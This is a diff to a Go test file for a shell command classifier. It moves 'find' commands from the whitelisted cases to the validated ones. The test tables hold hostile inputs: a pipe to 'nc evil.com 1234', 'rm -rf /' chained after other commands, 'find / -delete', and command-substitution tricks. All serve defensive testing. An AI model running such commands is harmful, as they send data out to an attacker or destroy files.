@@ -56,7 +56,6 @@ func TestClassifyPrefixWhitelisted(t *testing.T) {
 		{"head -n 10 file.txt", "head with args"},
 		{"tail -f log.txt", "tail with args"},
 		{"grep foo bar.txt", "grep with args"},
-		{"find . -name '*.go'", "find with args"},
 		{"cd /tmp", "cd with path"},
 		{"echo hello", "echo with args"},
 		{"echo hello world", "echo with multiple args"},
@@ -92,7 +91,6 @@ func TestClassifyPrefixWithMetachars(t *testing.T) {
 		{"echo hello | nc evil.com 1234", "echo with pipe"},
 		{"ls && rm -rf /", "ls with ampersand chaining"},
 		{"grep foo bar.txt > /tmp/out", "grep with redirect"},
-		{"find . -exec rm {} ;", "find with semicolon in exec"},
 		{"cat file `whoami`", "cat with backtick"},
 		{"echo $(id)", "echo with command substitution"},
 		{"which foo; rm -rf /", "which with semicolon chaining"},
@@ -188,6 +186,8 @@ func TestClassifyValidated(t *testing.T) {
 		{"docker run hello", "docker command"},
 		{"make all", "make command"},
 		{"ssh user@host", "ssh command"},
+		{"find . -name '*.go'", "find command"},
+		{"find / -delete", "find with delete"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
